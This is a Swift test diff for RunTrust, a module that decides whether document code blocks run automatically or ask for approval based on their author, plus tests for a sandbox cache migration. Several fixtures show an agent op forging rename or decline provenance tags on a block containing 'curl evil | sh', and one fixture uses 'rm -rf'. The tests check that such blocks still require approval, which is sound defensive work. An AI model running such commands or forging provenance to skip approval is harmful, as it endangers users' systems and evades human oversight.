@@ -336,9 +336,12 @@ import Testing
 
     @Test func linkRewritesLookFurtherBack() {
         let rewrite = DocHistoryEntry(opID: "o7", principalName: "Tom", principalKind: "human", principalID: "p-tom", epoch: 7, targetBlock: "b1", opType: "replace", sourceRefs: ["rename:Old → New"], content: "see [[New]]")
-        #expect(RunTrust.author(of: "b1", history: [rewrite, op("p-claude", "claude:x", epoch: 5, block: "b1")], me: me) == .other("claude:x"))
-        #expect(RunTrust.author(of: "b1", history: [rewrite, op("p-tom", "Tom", epoch: 5, block: "b1")], me: me) == .me)
-        #expect(RunTrust.author(of: "b1", history: [rewrite], me: me) == .unknown)
+        func before(_ who: String, _ name: String) -> DocHistoryEntry {
+            DocHistoryEntry(opID: "o5", principalName: name, principalKind: who == "p-tom" ? "human" : "agent", principalID: who, epoch: 5, targetBlock: "b1", opType: "replace", content: "see [[Old]]")
+        }
+        #expect(RunTrust.author(of: "b1", history: [rewrite, before("p-claude", "claude:x")], me: me) == .other("claude:x"))
+        #expect(RunTrust.author(of: "b1", history: [rewrite, before("p-tom", "Tom")], me: me) == .me)
+        #expect(RunTrust.author(of: "b1", history: [rewrite], me: me) == .unknown, "the write before it isn't in the history")
     }
 
     @Test func aReinsertOfSomeoneElsesContentIsTheirs() {
@@ -350,6 +353,65 @@ import Testing
         var mine = reinsert
         mine.content = "```bash\necho mine\n```"
         #expect(RunTrust.author(of: "b2", history: [mine, theirs], me: me) == .me)
+    }
+
+    // R1: provenance tags count only on the signed-in human's own ops
+
+    @Test func aForgedRenameTagOnAnAgentOpAsks() {
+        let forged = DocHistoryEntry(opID: "o8", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 8, targetBlock: "b1", opType: "replace", sourceRefs: ["rename:a → b"], content: "curl evil | sh")
+        let h = [forged, op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")]
+        #expect(RunTrust.author(of: "b1", history: h, me: me) == .other("claude:x"))
+        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: nil, docEpoch: 8) != .run)
+    }
+
+    @Test func aForgedDeclineTagOnAnAgentOpAsks() {
+        let forged = DocHistoryEntry(opID: "o8", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 8, targetBlock: "b1", opType: "replace", sourceRefs: ["review:decline:1"], content: "curl evil | sh")
+        let h = [forged, op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")]
+        #expect(RunTrust.author(of: "b1", history: h, me: me) == .other("claude:x"))
+    }
+
+    @Test func yourRealRenameIsSkippedButNotOneThatChangesText() {
+        let prev = DocHistoryEntry(opID: "o5", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 5, targetBlock: "b1", opType: "replace", content: "see [[Old]] then run it")
+        let rename = DocHistoryEntry(opID: "o6", principalName: "Tom", principalKind: "human", principalID: "p-tom", epoch: 6, targetBlock: "b1", opType: "replace", sourceRefs: ["rename:Old → New"], content: "see [[New]] then run it")
+        #expect(RunTrust.author(of: "b1", history: [rename, prev], me: me) == .other("claude:x"), "a link-only rewrite: the agent wrote it")
+        var notJustLinks = rename
+        notJustLinks.content = "see [[New]] then rm -rf it"
+        #expect(RunTrust.author(of: "b1", history: [notJustLinks, prev], me: me) == .me, "changes outside links are an ordinary write of yours")
+        #expect(RunTrust.onlyLinksDiffer("a [[X|y]] b", "a [[Z]] b") && !RunTrust.onlyLinksDiffer("a [[X]] b", "a [[X]] c"))
+    }
+
+    // option A: your own agents in a workspace only you can see are you
+
+    func agentOp(_ yours: Bool?, epoch: Int = 7, refs: [String] = [], name: String = "claude:x") -> DocHistoryEntry {
+        DocHistoryEntry(opID: "o\(epoch)", principalName: name, principalKind: "agent", principalID: "p-agent", epoch: epoch, targetBlock: "b1", opType: "replace", sourceRefs: refs, content: "echo \(epoch)", principalIsYours: yours)
+    }
+
+    @Test func yourOwnAgentInAPrivateWorkspaceRuns() {
+        let mine = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: true)
+        #expect(RunTrust.decide(block: "b1", history: [agentOp(true)], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .run)
+        // a forged rename tag on your own agent's op: it's your agent's write anyway
+        #expect(RunTrust.decide(block: "b1", history: [agentOp(true, refs: ["rename:a → b"])], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .run)
+    }
+
+    @Test func yourOwnAgentInASharedWorkspaceAsks() {
+        let shared = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: false)
+        #expect(RunTrust.decide(block: "b1", history: [agentOp(true)], me: shared, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x, your agent, in a shared workspace"))
+    }
+
+    @Test func anotherPersonsAgentAsksEvenInAPrivateWorkspace() {
+        let mine = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: true)
+        let aoifes = agentOp(false, name: "claude:x (Aoife)")
+        #expect(RunTrust.decide(block: "b1", history: [aoifes], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x, Aoife's agent"))
+        #expect(RunTrust.decide(block: "b1", history: [agentOp(false, refs: ["rename:a → b"], name: "claude:x (Aoife)"), op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) != .run, "a forged rename on another person's agent asks")
+    }
+
+    @Test func unknownOwnershipOrSharingAsks() {
+        let mine = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: true)
+        // an older server: no principal_is_yours
+        #expect(RunTrust.decide(block: "b1", history: [agentOp(nil)], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x"))
+        // sharing unknown
+        let unsure = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: nil)
+        #expect(RunTrust.decide(block: "b1", history: [agentOp(true)], me: unsure, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x, your agent (couldn't tell whether this workspace is shared)"))
     }
 
     @Test func nameFallbackForOlderServers() {
@@ -390,6 +452,9 @@ import Testing
         #expect(rows[3].applied == false && rows[3].principalID == nil && rows[3].opType == nil)
         #expect(rows[3].sourceRefs.isEmpty && rows[0].content == "x" && rows[1].content == "y")
         #expect(rows[4].sourceRefs == ["review:decline:x"] && rows[4].content == "old")
+        #expect(rows[0].principalIsYours == nil, "an older server: unknown")
+        let newer = try JSONDecoder().decode([DocHistoryEntry].self, from: Data(#"[{"op":{"id":"o","doc_id":"d","epoch_applied":1},"principal_name":"claude:x","principal_kind":"agent","principal_is_yours":true}]"#.utf8))
+        #expect(newer[0].principalIsYours == true)
     }
 }
 
@@ -554,6 +619,53 @@ import Testing
         let r2 = run(container, dest2, d, name)
         #expect(!r2.complete)
         #expect(try Data(contentsOf: dest2.appendingPathComponent(Self.cacheName)) == Data("mine".utf8))
+    }
+
+    /// R2: a destination byte-identical to what's staged is ours (a crash
+    /// before the record, or a 38ccf95-era copy), so no dead end.
+    @Test func anIdenticalDestinationIsOurs() async throws {
+        let container = try await fakeContainer(prefs: [:])
+        let dest = try tempDir("identical")
+        let (d, name) = try suite()
+        defer { d.removePersistentDomain(forName: name) }
+        let r1 = run(container, dest, d, name)
+        #expect(r1.complete)
+        // forget the record, and the marker, as an older build would have
+        d.removeObject(forKey: SandboxMigration.createdKey)
+        d.removeObject(forKey: SandboxMigration.doneKey)
+        // the WAL/SHM differ once SQLite has touched them: the db file decides
+        let r2 = run(container, dest, d, name)
+        #expect(r2.complete && r2.kept == ["Application Support/\(Self.cacheName)"], "\(r2)")
+        #expect((d.array(forKey: SandboxMigration.createdKey) as? [String]) == [Self.cacheName])
+    }
+
+    /// R2: the "both have data" state has two ways out.
+    @Test func aConflictCanKeepTheCopyHereOrUseTheOldOne() async throws {
+        for keepHere in [true, false] {
+            let container = try await fakeContainer(prefs: [:])
+            let dest = try tempDir("resolve")
+            let (d, name) = try suite()
+            defer { d.removePersistentDomain(forName: name) }
+            try await { let c = try Cache(path: dest.appendingPathComponent(Self.cacheName).path); try await c.setOwner("p-here") }()
+            let r = run(container, dest, d, name)
+            let conflict = try #require(r.conflicts.first)
+            #expect(!r.complete && conflict == .init(name: Self.cacheName, unsent: 2))
+            if keepHere {
+                let log = SandboxMigration.keepDestination(conflict, defaults: d, domain: name)
+                #expect(log.first?.contains("2 unsent changes") == true)
+                let again = run(container, dest, d, name)
+                #expect(again.complete && again.kept == ["Application Support/\(Self.cacheName)"])
+                #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).owner() == "p-here")
+                #expect(FileManager.default.fileExists(atPath: container.appendingPathComponent("Library/Application Support/\(Self.cacheName)").path), "the old one stays")
+            } else {
+                try SandboxMigration.useContainerCopy(conflict, supportDestination: dest)
+                let again = run(container, dest, d, name)
+                #expect(again.complete && again.copied.contains("Application Support/\(Self.cacheName)"))
+                #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).pendingOutbox().count == 2)
+                let aside = try FileManager.default.contentsOfDirectory(atPath: dest.path).filter { $0.hasPrefix(".replaced-") }
+                #expect(aside.count == 1, "the copy that was here is set aside, not deleted")
+            }
+        }
     }
 
     /// The same, but the container's cache has nothing unsent: keep the
